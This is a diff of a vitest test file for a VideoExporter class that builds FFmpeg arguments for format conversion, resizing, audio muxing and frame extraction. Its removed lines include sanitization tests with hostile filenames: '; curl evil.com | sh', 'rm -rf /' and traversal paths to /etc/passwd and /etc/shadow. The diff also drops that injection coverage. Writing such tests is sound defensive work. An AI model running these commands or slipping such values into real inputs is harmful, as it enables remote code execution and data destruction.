@@ -1,77 +1,97 @@
 import { describe, it, expect } from 'vitest';
-import { VideoExporter, PathSanitizationError } from '../../../src/export/VideoExporter.js';
-import path from 'path';
+import { VideoExporter } from '../../../src/export/VideoExporter.js';
 
 describe('VideoExporter', () => {
-  it('builds correct FFmpeg args for MP4 to GIF conversion', () => {
-    const exporter = new VideoExporter();
-    const args = exporter.buildConvertArgs('input.mp4', 'output.gif', 'gif');
-    expect(args).toContain('-i');
-    expect(args).toContain('input.mp4');
-    expect(args).toContain('output.gif');
+  describe('constructor', () => {
+    it('uses default ffmpeg path when not specified', () => {
+      const exporter = new VideoExporter();
+      const args = exporter.buildConvertArgs('in.mov', 'out.mp4', 'mp4');
+      expect(args[0]).toBe('-i');
+    });
+
+    it('accepts custom ffmpeg path', () => {
+      const exporter = new VideoExporter({ ffmpegPath: '/custom/ffmpeg' });
+      expect(exporter).toBeDefined();
+    });
   });
 
-  it('builds correct FFmpeg args for resize', () => {
-    const exporter = new VideoExporter();
-    const args = exporter.buildResizeArgs('input.mp4', 'output.mp4', 1080, 1920);
-    expect(args).toEqual(expect.arrayContaining([expect.stringContaining('scale')]));
+  describe('buildConvertArgs', () => {
+    it('builds mp4 args with libx264', () => {
+      const args = new VideoExporter().buildConvertArgs('input.mov', 'output.mp4', 'mp4');
+      expect(args).toContain('-i');
+      expect(args).toContain('input.mov');
+      expect(args).toContain('-y');
+      expect(args).toContain('libx264');
+      expect(args).toContain('output.mp4');
+    });
+
+    it('builds gif args with palette pipeline', () => {
+      const args = new VideoExporter().buildConvertArgs('input.mov', 'output.gif', 'gif');
+      // fps=15 is embedded in a longer -vf value
+      expect(args.some(a => a.includes('fps=15'))).toBe(true);
+      expect(args.some(a => a.includes('paletteuse'))).toBe(true);
+      expect(args).toContain('output.gif');
+    });
+
+    it('builds webm args with libvpx-vp9', () => {
+      const args = new VideoExporter().buildConvertArgs('input.mov', 'output.webm', 'webm');
+      expect(args).toContain('libvpx-vp9');
+      expect(args).toContain('-crf');
+      expect(args).toContain('30');
+      expect(args).toContain('output.webm');
+    });
+
+    it('defaults to mp4 for unknown format', () => {
+      const args = new VideoExporter().buildConvertArgs('in', 'out', 'avi');
+      expect(args).toContain('libx264');
+    });
   });
 
-  it('builds FFmpeg args for adding audio track', () => {
-    const exporter = new VideoExporter();
-    const args = exporter.buildAddAudioArgs('input.mp4', 'audio.mp3', 'output.mp4');
-    expect(args).toContain('-i');
-    expect(args.filter(a => a === '-i').length).toBeGreaterThanOrEqual(2);
+  describe('buildResizeArgs', () => {
+    it('builds resize args with correct dimensions', () => {
+      const args = new VideoExporter().buildResizeArgs('in.mp4', 'out.mp4', 1920, 1080);
+      expect(args).toContain('-i');
+      expect(args).toContain('in.mp4');
+      expect(args).toContain('-y');
+      expect(args.some(a => a.includes('1920:1080'))).toBe(true);
+      expect(args).toContain('-c:a');
+      expect(args).toContain('copy');
+      expect(args).toContain('out.mp4');
+    });
   });
 
-  it('throws descriptive error when FFmpeg not found', async () => {
-    const exporter = new VideoExporter({ ffmpegPath: '/nonexistent/ffmpeg' });
-    // Use paths relative to cwd to pass sanitization
-    const inputPath = path.join(process.cwd(), 'test-input.mp4');
-    const outputPath = path.join(process.cwd(), 'test-output.gif');
-    await expect(exporter.convert(inputPath, outputPath, 'gif'))
-      .rejects.toThrow('FFmpeg');
+  describe('buildAddAudioArgs', () => {
+    it('builds add-audio args with shortest flag', () => {
+      const args = new VideoExporter().buildAddAudioArgs('vid.mp4', 'aud.mp3', 'out.mp4');
+      expect(args).toContain('-i');
+      expect(args).toContain('vid.mp4');
+      expect(args).toContain('aud.mp3');
+      expect(args).toContain('-shortest');
+      expect(args).toContain('-map');
+      expect(args).toContain('0:v:0');
+      expect(args).toContain('1:a:0');
+      expect(args).toContain('out.mp4');
+    });
   });
 
-  it('builds args for frames to video', () => {
-    const exporter = new VideoExporter();
-    const args = exporter.buildFramesToVideoArgs('frames/', 'output.mp4', 30);
-    expect(args).toContain('-framerate');
-    expect(args).toContain('30');
+  describe('buildExtractFramesArgs', () => {
+    it('builds extract-frames args with fps', () => {
+      const args = new VideoExporter().buildExtractFramesArgs('video.mp4', '/tmp/frames', 30);
+      expect(args).toContain('-i');
+      expect(args).toContain('video.mp4');
+      expect(args.some(a => a.includes('fps=30'))).toBe(true);
+      expect(args.some(a => a.includes('frame_%05d.png'))).toBe(true);
+    });
   });
 
-  it('builds args for extracting frames', () => {
-    const exporter = new VideoExporter();
-    const args = exporter.buildExtractFramesArgs('input.mp4', 'frames/', 24);
-    expect(args).toContain('-i');
-    expect(args).toContain('input.mp4');
-    // fps is embedded inside the -vf filter string, e.g. 'fps=24'
-    expect(args).toEqual(expect.arrayContaining([expect.stringContaining('fps=24')]));
-    expect(args).toEqual(expect.arrayContaining([expect.stringContaining('frames/')]));
-  });
-
-  it('rejects malicious filenames with command injection', async () => {
-    const exporter = new VideoExporter();
-    await expect(exporter.convert('; curl evil.com | sh #.mp4', 'output.gif', 'gif'))
-      .rejects.toThrow(PathSanitizationError);
-    await expect(exporter.convert('input.mp4', 'video.mp4; rm -rf /', 'mp4'))
-      .rejects.toThrow(PathSanitizationError);
-  });
-
-  it('rejects path traversal attempts', async () => {
-    const exporter = new VideoExporter();
-    await expect(exporter.convert('../../../etc/passwd', 'output.gif', 'gif'))
-      .rejects.toThrow(PathSanitizationError);
-    await expect(exporter.convert('input.mp4', '../../../etc/shadow', 'mp4'))
-      .rejects.toThrow(PathSanitizationError);
-  });
-
-  it('allows valid filenames with spaces and unicode', async () => {
-    const exporter = new VideoExporter({ ffmpegPath: '/nonexistent/ffmpeg' });
-    // These should pass sanitization but fail at FFmpeg (which is fine for this test)
-    const inputPath = path.join(process.cwd(), 'file with spaces.mp4');
-    const outputPath = path.join(process.cwd(), 'unicode_文件.gif');
-    await expect(exporter.convert(inputPath, outputPath, 'gif'))
-      .rejects.toThrow('FFmpeg');
+  describe('buildFramesToVideoArgs', () => {
+    it('builds frames-to-video args with framerate', () => {
+      const args = new VideoExporter().buildFramesToVideoArgs('/tmp/frames', 'output.mp4', 24);
+      expect(args).toContain('-framerate');
+      expect(args).toContain('24');
+      expect(args).toContain('libx264');
+      expect(args).toContain('yuv420p');
+      expect(args).toContain('output.mp4');
+    });
   });
 });
